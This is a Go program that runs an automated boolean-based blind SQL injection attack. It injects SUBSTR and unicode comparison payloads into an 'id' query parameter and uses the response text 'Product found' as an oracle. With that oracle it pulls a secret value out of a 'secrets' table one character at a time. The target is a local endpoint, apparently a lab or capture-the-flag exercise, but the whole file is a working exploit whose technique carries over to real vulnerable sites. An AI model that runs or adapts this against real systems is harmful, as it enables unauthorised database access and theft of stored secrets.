package main

import (
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

const (
	Lowercase = "abcdefghijklmnopqrstuvwxyz"
	Uppercase = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
	Digits    = "0123456789"
	Symbols   = "{}_-"

	DefaultCharset = Lowercase + Uppercase + Digits + Symbols
)

const (
	ASCIIMin = 32
	ASCIIMax = 126
)

type HTTPClient struct {
	BaseURL string
	Client  *http.Client
	Timeout time.Duration
}

type Observation struct {
	StatusCode int
	Status     string
	Body       string
	BodyLen    int
	Elapsed    time.Duration
}

func urlValidator(raw string) error {
	u, err := url.Parse(raw)
	if err != nil {
		return fmt.Errorf("url parse %w", err)
	}
	if u.Scheme != "http" && u.Scheme != "https" {
		return errors.New("incorrect url scheme")
	}

	if u.Host == "" {
		return errors.New("host is required")
	}

	return nil
}

func NewHTTPClient(baseURL string, timeOut time.Duration) (HTTPClient, error) {
	if timeOut <= 0 {
		return HTTPClient{}, errors.New("timeout must be positive")
	}

	if err := urlValidator(baseURL); err != nil {
		return HTTPClient{}, err
	}

	baseURL = strings.TrimRight(baseURL, "/")

	client := http.Client{
		Timeout: timeOut,
	}

	return HTTPClient{
		BaseURL: baseURL,
		Client:  &client,
		Timeout: timeOut,
	}, nil
}

func (c *HTTPClient) SendPayload(payload string) (Observation, error) {
	startTime := time.Now()

	q := url.Values{}
	q.Set("id", payload)

	targetURL := c.BaseURL + "?" + q.Encode()

	req, err := http.NewRequest(http.MethodGet, targetURL, nil)
	if err != nil {
		return Observation{}, fmt.Errorf("send request %w", err)
	}

	resp, err := c.Client.Do(req)
	if err != nil {
		var netErr net.Error
		if errors.As(err, &netErr) && netErr.Timeout() {
			return Observation{}, fmt.Errorf("request timeout %w", err)
		}
		return Observation{}, fmt.Errorf("create new request %w", err)
	}

	defer resp.Body.Close()

	limitedReader := io.LimitReader(resp.Body, 1024*1024)
	res, err := io.ReadAll(limitedReader)
	if err != nil {
		return Observation{}, fmt.Errorf("read resp erro %w", err)
	}

	elapsed := time.Since(startTime)

	return Observation{
		Status:     resp.Status,
		StatusCode: resp.StatusCode,
		Body:       string(res),
		BodyLen:    len(res),
		Elapsed:    elapsed,
	}, nil
}

func printResult(response Observation) {
	fmt.Println("Status:", response.Status)
	fmt.Println("Status code:", response.StatusCode)
	fmt.Println("Body:", response.Body)
	fmt.Println("Body len:", response.BodyLen)
	fmt.Println("Elapsed time:", response.Elapsed)
}

func bodyContainsOracle(obs Observation, marker string) bool {
	return strings.Contains(obs.Body, marker)
}

func buildCharEqualsPayload(position int, ch rune) string {
	return fmt.Sprintf(
		"1' AND SUBSTR((SELECT value FROM secrets LIMIT 1),%d,1)='%c'-- -",
		position,
		ch,
	)
}

func buildASCIIEqualsPayload(position int, code int) string {
	return fmt.Sprintf(
		"1' AND unicode(SUBSTR((SELECT value FROM secrets LIMIT 1),%d,1))=%d-- -",
		position,
		code,
	)
}

func (c *HTTPClient) ExtractByCharset(maxLen int, charset string) (string, error) {
	if maxLen <= 0 {
		return "", errors.New("maxLen must be positive")
	}

	if strings.TrimSpace(charset) == "" {
		return "", errors.New("charset cannot be empty")
	}

	var result strings.Builder

	for position := 1; position <= maxLen; position++ {
		found := false

		for _, ch := range charset {
			payload := buildCharEqualsPayload(position, ch)

			obs, err := c.SendPayload(payload)
			if err != nil {
				return "", fmt.Errorf("send payload at position %d char %q: %w", position, ch, err)
			}

			if bodyContainsOracle(obs, "Product found") {
				result.WriteRune(ch)
				found = true
				fmt.Println("[+]", result.String())
				break
			}
		}

		if !found {
			break
		}
	}

	return result.String(), nil
}

func (c *HTTPClient) ExtractByASCII(maxLen int, minCode int, maxCode int) (string, error) {
	if maxLen <= 0 {
		return "", errors.New("maxLen must be positive")
	}

	if minCode <= 0 {
		return "", errors.New("minCode must be positive")
	}

	if maxCode <= 0 {
		return "", errors.New("maxCode must be positive")
	}

	if minCode > maxCode {
		return "", errors.New("minCode cannot be greater than maxCode")
	}

	var result strings.Builder

	for position := 1; position <= maxLen; position++ {
		found := false

		for code := minCode; code <= maxCode; code++ {
			payload := buildASCIIEqualsPayload(position, code)

			obs, err := c.SendPayload(payload)
			if err != nil {
				return "", fmt.Errorf("send payload at position %d code %d: %w", position, code, err)
			}

			ok := bodyContainsOracle(obs, "Product found")
			if ok {
				result.WriteRune(rune(code))
				found = true

				fmt.Println("[+] Current result:", result.String())
				break
			}
		}

		if !found {
			break
		}
	}

	return result.String(), nil
}

func main() {
	client, err := NewHTTPClient("http://127.0.0.1:5003/boolean", 5*time.Second)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}

	payloads := []string{
		"1' AND 1=1-- -",
		"1' AND 1=2-- -",
	}

	for _, payload := range payloads {
		result, err := client.SendPayload(payload)
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
			continue
		}

		ok := bodyContainsOracle(result, "Product found")

		printResult(result)
		fmt.Println("Oracle:", ok)
		fmt.Println()
	}

	charsetSecret, err := client.ExtractByCharset(21, DefaultCharset)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}

	fmt.Println("Charset extracted secret:", charsetSecret)

	asciiSecret, err := client.ExtractByASCII(21, ASCIIMin, ASCIIMax)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}

	fmt.Println("ASCII extracted secret:", asciiSecret)
}
